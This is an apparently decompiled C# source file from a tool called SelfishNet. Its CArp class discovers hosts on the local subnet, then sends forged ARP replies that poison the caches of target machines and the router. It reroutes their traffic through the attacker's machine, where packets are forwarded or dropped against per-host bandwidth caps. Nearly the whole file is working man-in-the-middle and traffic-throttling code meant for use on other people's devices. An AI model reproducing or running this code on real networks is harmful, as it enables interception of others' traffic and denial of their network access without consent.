using PcapNet;
using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SelfishNet
{
    public class CArp : IDisposable
    {
        private bool isListeningArp;

        private bool isRedirecting;

        private bool isDiscovering;

        private PcList pcList;

        private NetworkInterface networkInterface;

        private CPcapNet pcaparp;

        private CPcapNet pcapredirect;

        //private Thread arpListenerThread;

        //private Thread redirectorThread;

        //private Thread discoveringThread;

        //private EventWaitHandle arpListenerThreadTerminated;

        //private EventWaitHandle redirectorThreadTerminated;

        //private EventWaitHandle discovererThreadTerminated;

        public byte[] localIP;

        public byte[] localMAC;

        public byte[] netmask;

        public byte[] routerIP;

        public byte[] routerMAC;

        public byte[] broadcastMac;

        public CArp(NetworkInterface networkInterface, PcList pclist)
        {
            pcList = pclist;
            this.networkInterface = networkInterface;
            int num = 0;
            if (0 < networkInterface.GetIPProperties().UnicastAddresses.Count)
            {
                do
                {
                    if (!Convert.ToString(this.networkInterface.GetIPProperties().UnicastAddresses[num].Address.AddressFamily).EndsWith("V6"))
                    {
                        CArp addressBytes = this;
                        addressBytes.localIP = addressBytes.networkInterface.GetIPProperties().UnicastAddresses[num].Address.GetAddressBytes();
                        CArp cArp = this;
                        cArp.netmask = cArp.networkInterface.GetIPProperties().UnicastAddresses[num].IPv4Mask.GetAddressBytes();
                    }
                    num++;
                }
                while (num < this.networkInterface.GetIPProperties().UnicastAddresses.Count);
            }
            CArp addressBytes1 = this;
            addressBytes1.localMAC = addressBytes1.networkInterface.GetPhysicalAddress().GetAddressBytes();
            if (this.networkInterface.GetIPProperties().GatewayAddresses.Count > 0)
            {
                CArp cArp1 = this;
                cArp1.routerIP = cArp1.networkInterface.GetIPProperties().GatewayAddresses[0].Address.GetAddressBytes();
            }
            byte[] numArray = new byte[6];
            broadcastMac = numArray;
            int num1 = 0;
            do
            {
                numArray[num1] = 255;
                num1++;
            }
            while (num1 < 6);
            pcaparp = new CPcapNet();
            pcapredirect = new CPcapNet();
            //arpListenerThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
            //redirectorThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
            //discovererThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
            isListeningArp = false;
            isDiscovering = false;
            isRedirecting = false;
        }

        private async void arpListener()
        {
            byte[] numArray = null;
            packet_headers packetHeader = null;
            isListeningArp = true;
            do
            {
                if (pcaparp.pcapnet_next_ex(out packetHeader, out numArray) == 0)
                {
                    continue;
                }
                byte[] numArray1 = new byte[6];
                Array.Copy(numArray, 6, numArray1, 0, 6);
                if (tools.areValuesEqual(numArray1, localMAC) || numArray[21].ToString().CompareTo("2") != 0)
                {
                    continue;
                }
                byte[] numArray2 = new byte[4];
                byte[] numArray3 = new byte[6];
                Array.Copy(numArray, 22, numArray3, 0, 6);
                Array.Copy(numArray, 28, numArray2, 0, 4);
                PC pC = new PC()
                {
                    ip = new IPAddress(numArray2),
                    mac = new PhysicalAddress(numArray3),
                    CapDown = 0,
                    CapUp = 0,
                    isLocalPc = false,
                    name = "",
                    nbPacketReceivedSinceLastReset = 0,
                    nbPacketSentSinceLastReset = 0,
                    redirect = true,
                    timeSinceLastRarp = DateTime.Now,
                    totalPacketReceived = 0,
                    totalPacketSent = 0
                };
                if (!tools.areValuesEqual(numArray2, routerIP))
                {
                    pC.isGateway = false;
                }
                else
                {
                    routerMAC = numArray1;
                    pC.isGateway = true;
                }
                pcList.addPcToList(pC);
                await Task.Delay(20);
            }
            while (isListeningArp);
            //arpListenerThreadTerminated.Set();
        }

        public byte[] buildArpPacket(byte[] destMac, byte[] srcMac, short arpType, byte[] arpSrcMac, byte[] arpSrcIp, byte[] arpDestMac, byte[] arpDestIP)
        {
            byte[] numArray = new byte[42];
            Array.Copy(destMac, 0, numArray, 0, 6);
            Array.Copy(srcMac, 0, numArray, 6, 6);
            numArray[12] = 8;
            numArray[13] = 6;
            numArray[14] = 0;
            numArray[15] = 1;
            numArray[16] = 8;
            numArray[17] = 0;
            numArray[18] = 6;
            numArray[19] = 4;
            numArray[20] = 0;
            numArray[21] = (byte)arpType;
            Array.Copy(arpSrcMac, 0, numArray, 22, 6);
            Array.Copy(arpSrcIp, 0, numArray, 28, 4);
            Array.Copy(arpDestMac, 0, numArray, 32, 6);
            Array.Copy(arpDestIP, 0, numArray, 38, 4);
            return numArray;
        }

        public void completeUnspoof()
        {
            PC router = pcList.getRouter();
            if (router != null)
            {
                int num = 0;
                if (0 < pcList.pclist.Count)
                {
                    do
                    {
                        CArp cArp = this;
                        cArp.UnSpoof(((PC)cArp.pcList.pclist[num]).ip, router.ip);
                        num++;
                    }
                    while (num < pcList.pclist.Count);
                }
            }
        }

        private async void Discoverer()
        {
            int num;
            int num1;
            int num2;
            isDiscovering = true;
            IPAddress pAddress = new IPAddress(netmask);
            char[] chrArray = new char[] { '.', '\u0003' };
            string[] strArrays = pAddress.ToString().Split(chrArray);
            int[] numArray = new int[4];
            int num3 = 0;
            do
            {
                numArray[num3] = Convert.ToInt32(strArrays[num3]);
                num3++;
            }
            while (num3 < 4);
            IPAddress pAddress1 = new IPAddress(localIP);
            char[] chrArray1 = new char[] { '.', '\u0003' };
            string[] strArrays1 = pAddress1.ToString().Split(chrArray1);
            int[] numArray1 = new int[4];
            int num4 = 0;
            do
            {
                numArray1[num4] = Convert.ToInt32(strArrays1[num4]);
                num4++;
            }
            while (num4 < 4);
            int num5 = numArray[0];
            int num6 = 256 - num5;
            int num7 = numArray1[0] / num6 * num6;
            int num8 = (255 - num5) / num6 + num7;
            if (num8 < num7 - num5 + 256)
            {
                do
                {
                    int num9 = numArray[1];
                    int num10 = -num9;
                    int num11 = numArray1[1] / (num10 + 256) * (num10 + 256);
                    int num12 = (num10 + 255) / (num10 + 256) + num11;
                    if (num12 < num11 - num9 + 256)
                    {
                        do
                        {
                            int num13 = numArray[2];
                            int num14 = -num13;
                            int num15 = numArray1[2] / (num14 + 256) * (num14 + 256);
                            int num16 = (num14 + 255) / (num14 + 256) + num15;
                            if (num16 < num15 - num13 + 256)
                            {
                                int num17 = numArray1[3];
                                int num18 = numArray[3];
                                do
                                {
                                    int num19 = -num18;
                                    int num20 = num17 / (num19 + 256) * (num19 + 256);
                                    int num21 = (num19 + 255) / (num19 + 256) + num20;
                                    if (num21 < num20 - num18 + 256)
                                    {
                                        while (isDiscovering)
                                        {
                                            string[] str = new string[] { num8.ToString(), ".", num12.ToString(), ".", num16.ToString(), ".", num21.ToString() };
                                            FindMac(string.Concat(str));
                                            //Thread.Sleep(5);
                                            await Task.Delay(5);
                                            num21++;
                                            num18 = numArray[3];
                                            int num22 = 256 - num18;
                                            num17 = numArray1[3];
                                            if (num21 >= num17 / num22 * num22 - num18 + 256)
                                            {
                                                goto Label1;
                                            }
                                        }
                                        //discovererThreadTerminated.Set();
                                        return;
                                    }
                                Label1:
                                    num16++;
                                    num13 = numArray[2];
                                    num2 = 256 - num13;
                                }
                                while (num16 < numArray1[2] / num2 * num2 - num13 + 256);
                            }
                            num12++;
                            num9 = numArray[1];
                            num1 = 256 - num9;
                        }
                        while (num12 < numArray1[1] / num1 * num1 - num9 + 256);
                    }
                    num8++;
                    num5 = numArray[0];
                    num = 256 - num5;
                }
                while (num8 < numArray1[0] / num * num - num5 + 256);
            }
            isDiscovering = false;
            //discovererThreadTerminated.Set();
        }

        //protected virtual void Dispose(bool flag)
        //{
        //	if (!flag)
        //	{
        //		Finalize();
        //	}
        //	else
        //	{
        //		~CArp();
        //	}
        //}

        //public sealed override void Dispose()
        //{
        //	//Dispose(true);
        //	GC.SuppressFinalize(this);
        //}

        public void FindMac(string ip)
        {
            string str = null;
            if (!(pcaparp.nicHandle == IntPtr.Zero) || pcaparp.pcapnet_openLive(networkInterface.Id, 65535, 0, 1, str))
            {
                byte[] addressBytes = tools.getIpAddress(ip).GetAddressBytes();
                byte[] numArray = broadcastMac;
                byte[] numArray1 = localMAC;
                pcaparp.pcapnet_sendpacket(buildArpPacket(numArray, numArray1, 1, numArray1, localIP, numArray, addressBytes));
            }
            else
            {
                MessageBox.Show(str);
            }
        }

        public void findMacRouter()
        {
            CArp cArp = this;
            cArp.FindMac((new IPAddress(cArp.routerIP)).ToString());
        }

        private void redirector()
        {
            byte[] numArray = null;
            packet_headers packetHeader = null;
            isRedirecting = true;
            byte[] numArray1 = new byte[6];
            byte[] numArray2 = new byte[4];
            byte[] numArray3 = new byte[4];
            PC router = pcList.getRouter();
            if (router != null)
            {
                routerMAC = router.mac.GetAddressBytes();
            }
            if (routerMAC != null)
            {
                if (isRedirecting)
                {
                    do
                    {
                        if (pcapredirect.pcapnet_next_ex(out packetHeader, out numArray) == 0)
                        {
                            continue;
                        }
                        Array.Copy(numArray, 6, numArray1, 0, 6);
                        if (tools.areValuesEqual(numArray1, localMAC))
                        {
                            Array.Copy(numArray, 26, numArray2, 0, 4);
                            if (!tools.areValuesEqual(numArray2, localIP))
                            {
                                continue;
                            }
                            pcList.getLocalPC().nbPacketSentSinceLastReset += (int)packetHeader.caplen;
                        }
                        else if (!tools.areValuesEqual(numArray1, routerMAC))
                        {
                            Array.Copy(numArray, 30, numArray3, 0, 4);
                            if (tools.areValuesEqual(numArray3, localIP))
                            {
                                continue;
                            }
                            PC pCFromMac = pcList.getPCFromMac(numArray1);
                            if (pCFromMac == null)
                            {
                                continue;
                            }
                            int num = pCFromMac.CapUp;
                            if (num != 0 && num <= pCFromMac.nbPacketSentSinceLastReset || !pCFromMac.redirect)
                            {
                                continue;
                            }
                            Array.Copy(routerMAC, 0, numArray, 0, 6);
                            Array.Copy(localMAC, 0, numArray, 6, 6);
                            pcapredirect.pcapnet_sendpacket(numArray);
                            pCFromMac.nbPacketSentSinceLastReset += (int)packetHeader.caplen;
                        }
                        else
                        {
                            Array.Copy(numArray, 30, numArray3, 0, 4);
                            if (!tools.areValuesEqual(numArray3, localIP))
                            {
                                PC pCFromIP = pcList.getPCFromIP(numArray3);
                                if (pCFromIP == null)
                                {
                                    continue;
                                }
                                int num1 = pCFromIP.CapDown;
                                if (num1 != 0 && num1 <= pCFromIP.nbPacketReceivedSinceLastReset || !pCFromIP.redirect)
                                {
                                    continue;
                                }
                                Array.Copy(pCFromIP.mac.GetAddressBytes(), 0, numArray, 0, 6);
                                Array.Copy(localMAC, 0, numArray, 6, 6);
                                pcapredirect.pcapnet_sendpacket(numArray);
                                pCFromIP.nbPacketReceivedSinceLastReset += (int)packetHeader.caplen;
                            }
                            else
                            {
                                pcList.getLocalPC().nbPacketReceivedSinceLastReset += (int)packetHeader.caplen;
                            }
                        }
                    }
                    while (isRedirecting);
                }
                //redirectorThreadTerminated.Set();
            }
            else
            {
                MessageBox.Show("no router found to redirect packet");
                isRedirecting = false;
            }
        }

        private void _007ECArp()
        {
            if (isDiscovering)
            {
                isDiscovering = false;
                //discovererThreadTerminated.WaitOne();
            }
            if (isListeningArp)
            {
                isListeningArp = false;
                //arpListenerThreadTerminated.WaitOne();
            }
            if (isRedirecting)
            {
                isRedirecting = false;
                //redirectorThreadTerminated.WaitOne();
            }
            completeUnspoof();
        }

        public void Spoof(IPAddress ip1, IPAddress ip2)
        {
            PC pCFromIP = pcList.getPCFromIP(ip1.GetAddressBytes());
            PC pC = pcList.getPCFromIP(ip2.GetAddressBytes());
            if (pCFromIP != null && pC != null)
            {
                byte[] numArray = localMAC;
                pcaparp.pcapnet_sendpacket(buildArpPacket(pCFromIP.mac.GetAddressBytes(), numArray, 2, numArray, pC.ip.GetAddressBytes(), pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes()));
                byte[] numArray1 = localMAC;
                pcaparp.pcapnet_sendpacket(buildArpPacket(pC.mac.GetAddressBytes(), numArray1, 2, numArray1, pCFromIP.ip.GetAddressBytes(), pC.mac.GetAddressBytes(), pC.ip.GetAddressBytes()));
                CArp cArp = this;
                pcaparp.pcapnet_sendpacket(cArp.buildArpPacket(cArp.localMAC, pC.mac.GetAddressBytes(), 2, pC.mac.GetAddressBytes(), pC.ip.GetAddressBytes(), localMAC, localIP));
                byte[] numArray2 = localMAC;
                pcaparp.pcapnet_sendpacket(buildArpPacket(numArray2, numArray2, 2, pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes(), localMAC, localIP));
            }
        }

        public int startArpDiscovery()
        {
            string str = null;
            if (pcaparp.nicHandle == IntPtr.Zero && !pcaparp.pcapnet_openLive(networkInterface.Id, 65535, 0, 1, str))
            {
                MessageBox.Show(str);
                return -1;
            }
            if (!isDiscovering)
            {
                /* modopt(System.Runtime.CompilerServices.IsConst) */
                //Thread thread = new Thread(new ThreadStart(discoverer));
                //discoveringThread = thread;
                //thread.Start();
                var task = new Task(() => Discoverer(),
                    TaskCreationOptions.LongRunning);
                task.Start();
            }
            return 0;
        }

        public int startArpListener()
        {
            string str = null;
            if (pcaparp.nicHandle == IntPtr.Zero && !pcaparp.pcapnet_openLive(networkInterface.Id, 65535, 0, 1, str))
            {
                MessageBox.Show(str);
                return -1;
            }
            if (pcaparp.pcapnet_setFilter("arp", uint.MaxValue) != 0)
            {
                return -2;
            }
            if (!isListeningArp)
            {
                /* modopt(System.Runtime.CompilerServices.IsConst) */
                //Thread thread = new Thread(new ThreadStart(arpListener));
                //arpListenerThread = thread;
                //thread.Start();

                var task = new Task(() => arpListener(), TaskCreationOptions.LongRunning);
                task.Start();
            }
            return 0;
        }

        public int startRedirector()
        {
            string str = null;
            if (pcapredirect.nicHandle == IntPtr.Zero && !pcapredirect.pcapnet_openLive(networkInterface.Id, 65535, 0, 1, str))
            {
                MessageBox.Show(str);
                return -1;
            }
            if (pcapredirect.pcapnet_setFilter("ip", uint.MaxValue) != 0) // review
            {
                return -2;
            }
            if (!isRedirecting)
            {
                /* modopt(System.Runtime.CompilerServices.IsConst) */
                //Thread thread = new Thread(new ThreadStart(redirector));
                //redirectorThread = thread;
                //thread.Start();

                var task = new Task(() => redirector(), TaskCreationOptions.LongRunning);
                task.Start();
            }
            return 0;
        }

        public void stopArpDiscovery()
        {
            if (isDiscovering)
            {
                isDiscovering = false;
                //discovererThreadTerminated.WaitOne();
            }
        }

        public void stopArpListener()
        {
            if (isListeningArp)
            {
                isListeningArp = false;
                //arpListenerThreadTerminated.WaitOne();
            }
        }

        public void stopRedirector()
        {
            if (isRedirecting)
            {
                isRedirecting = false;
                //redirectorThreadTerminated.WaitOne();
            }
        }

        public void UnSpoof(IPAddress ip1, IPAddress ip2)
        {
            PC pCFromIP = pcList.getPCFromIP(ip1.GetAddressBytes());
            PC pC = pcList.getPCFromIP(ip2.GetAddressBytes());
            if (pCFromIP != null && pC != null)
            {
                pcaparp.pcapnet_sendpacket(buildArpPacket(pCFromIP.mac.GetAddressBytes(), pC.mac.GetAddressBytes(), 1, pC.mac.GetAddressBytes(), pC.ip.GetAddressBytes(), broadcastMac, pCFromIP.ip.GetAddressBytes()));
                pcaparp.pcapnet_sendpacket(buildArpPacket(pC.mac.GetAddressBytes(), pCFromIP.mac.GetAddressBytes(), 1, pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes(), broadcastMac, pC.ip.GetAddressBytes()));
            }
        }

        protected virtual void Dispose([MarshalAs(UnmanagedType.U1)] bool P_0)
        {
            if (P_0)
            {
                _007ECArp();
            }
            else
            {
                //Finalize();
            }
        }

        // // TODO: override finalizer only if 'Dispose(bool disposing)' has code to free unmanaged resources
        // ~CArp()
        // {
        //     // Do not change this code. Put cleanup code in 'Dispose(bool disposing)' method
        //     Dispose(disposing: false);
        // }

        public void Dispose()
        {
            // Do not change this code. Put cleanup code in 'Dispose(bool disposing)' method
            Dispose(true);
            GC.SuppressFinalize(this);
        }
    }
}